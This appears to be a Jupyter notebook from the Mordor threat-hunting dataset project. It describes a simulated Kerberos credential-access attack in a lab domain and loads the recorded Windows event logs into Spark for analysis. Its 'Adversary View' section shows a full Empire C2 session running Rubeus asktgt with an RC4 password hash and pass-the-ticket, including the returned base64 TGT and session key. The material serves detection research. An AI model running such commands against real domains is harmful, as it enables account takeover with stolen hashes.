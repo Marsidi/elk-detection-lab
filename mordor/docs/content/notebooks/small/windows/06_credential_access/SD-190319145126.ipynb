{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Rubeus ASKTGT"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190319145126 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/03/19 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/GhostPack/Rubeus |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_rubeus_asktgt_ptt.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: 2MES3XN6) > shell Rubeus.exe asktgt /user:Mmidge /rc4:b415baa073a14f81f8c89a2a384f4a68 /ptt\n",
    "[*] Tasked 2MES3XN6 to run TASK_SHELL\n",
    "[*] Agent 2MES3XN6 tasked with task ID 21\n",
    "(Empire: 2MES3XN6) > ______        _                      \n",
    "  (_____ \\      | |                     \n",
    "  _____) )_   _| |__  _____ _   _  ___ \n",
    "  |  __  /| | | |  _ \\| ___ | | | |/___)\n",
    "  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n",
    "  |_|   |_|____/|____/|_____)____/(___/\n",
    "\n",
    "  v1.4.2 \n",
    "\n",
    "[*] Action: Ask TGT\n",
    "\n",
    "[*] Using rc4_hmac hash: b415baa073a14f81f8c89a2a384f4a68\n",
    "[*] Using domain controller: HFDC01.shire.com (172.18.39.5)\n",
    "[*] Building AS-REQ (w/ preauth) for: 'shire.com\\Mmidge'\n",
    "[+] TGT request successful!\n",
    "[*] base64(ticket.kirbi):\n",
    "\n",
    "      doIE5DCCBOCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+KADAgEFoQsbCVNISVJFLkNPTaIeMBygAwIB\n",
    "      AqEVMBMbBmtyYnRndBsJc2hpcmUuY29to4IDwjCCA76gAwIBEqEDAgECooIDsASCA6xLDFM5i+GcjKhK\n",
    "      ix5DoHwWPlrrbj4nPOcTyK/umBEnffx9hz7tu3acyQU127mvFR7u0JO3h6U6FPrKPz2iJ6v3sx5AYGM6\n",
    "      Imf0J2NBWb3+AU0WmuOBCa3k/BL+jl49isw6CuWHKrqyOk7SaoRORdd9G0hDv5zpHeF5Nzfz4dQ3GqmO\n",
    "      W2ORZuTQR868MYEFYnCIjY+wNf/ve9Cie6isW170KSEMPrWdQbeSFMu6KtJaCNLTc2800JTO3ObrOZUW\n",
    "      zylDRelTgBY4FCTyBUaseF45EWwFyiMeeABhgUZ1iFPGezsplcczGpaYB19bLz2r89j5k+3IJGzyOcA9\n",
    "      hECNycNVzycIcU4SUtKtxqiRLoPqfPjHq8codY1npbUsovsW6wEi25lgFxzlVdxF2Bek368qBU1B1s9g\n",
    "      CL06GUSjlfjPj9Heb7exTr9r+4j4JL+qVZaqlBtAQ4J38CKNJ9RdZME/9wRg6I/E15P8NNUAr7IOyF6S\n",
    "      cYlNQ07uRFRKBgi30JSdBC7CSe2x546Jrrd17YQtDOHbw1WFP7HvYgdT+Miuit/WoRttWmNTEv4vj6oD\n",
    "      +AuTrQKxnhbebef6MXXsR4ouDrBIlIw6r5T476ezkbNJeQwB6oryMUOsI3wu3DDFdRD7ZBY869fSC7Xe\n",
    "      1+6vRO4Vu/mUXYzw9xkJ0C7X+c4ljJetCZ/YV3zoc6Tw5WLjtfFJ0HuFdIxxOEj8xK0BoyGwnDz3fOGC\n",
    "      mEjH47U/w0EsUdBmnsZzRTujrTwGFbm/oCjOV9Dgae/aVLe0A+TSrWH2H8aKFmGeczrtTgEkGZDJyudm\n",
    "      bVdeymTc0bv8AT8s0moOKc64dhtib10LPnakbWDOSQOydi/abwuIaAB6+21F3cmZ9lq5/7e1LyYKWnxd\n",
    "      ATHPz+M9kWJi+xeqombWvozrjM2uIozFik7nY0rMdrbd/ItlML7bCuOuybksFe/1mmwscWvCoTOePzNS\n",
    "      NU2znzc8vDOSfaE5WLI9c1hJVjkarx9iL+kSM7N3yQEXkuwQuTY5Yswx1bht28sKjsU+Q0dZxdhNeErd\n",
    "      lJekqyf5NAKI2fmawmWBmzcXm7NDRATgDf3N9tpiTOW0x0Blv2F+SWXparZ06E5wdqNsV4l2Yf9x6yOp\n",
    "      exrQvjCznKbpbh0u1rlhm0Ya8yieDqbCKEIzxIk1IjYwx/4OQ6fdGAm6SjF+rH/Pnyh/o5X4DxLSeGEy\n",
    "      LPDjuDBHuReqj4UP//bhH7r5UptZuQ+cZ5liu58eo4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEw\n",
    "      ga6gGzAZoAMCARehEgQQfj5vhePBJY0eMPFDHvkIxKELGwlTSElSRS5DT02iEzARoAMCAQGhCjAIGwZN\n",
    "      bWlkZ2WjBwMFAEDhAAClERgPMjAxOTAzMTkxODU1NDlaphEYDzIwMTkwMzIwMDQ1NTQ5WqcRGA8yMDE5\n",
    "      MDMyNjE4NTU0OVqoCxsJU0hJUkUuQ09NqR4wHKADAgECoRUwExsGa3JidGd0GwlzaGlyZS5jb20=\n",
    "\n",
    "[*] Action: Import Ticket\n",
    "[+] Ticket successfully imported!\n",
    "\n",
    "[*] Action: Describe Ticket\n",
    "\n",
    "  UserName              :  Mmidge\n",
    "  UserRealm             :  SHIRE.COM\n",
    "  ServiceName           :  krbtgt/shire.com\n",
    "  ServiceRealm          :  SHIRE.COM\n",
    "  StartTime             :  3/19/2019 1:55:49 PM\n",
    "  EndTime               :  3/19/2019 11:55:49 PM\n",
    "  RenewTill             :  3/26/2019 1:55:49 PM\n",
    "  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n",
    "  KeyType               :  rc4_hmac\n",
    "  Base64(key)           :  fj5vhePBJY0eMPFDHvkIxA==\n",
    "\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 2MES3XN6) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_rubeus_asktgt_ptt.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
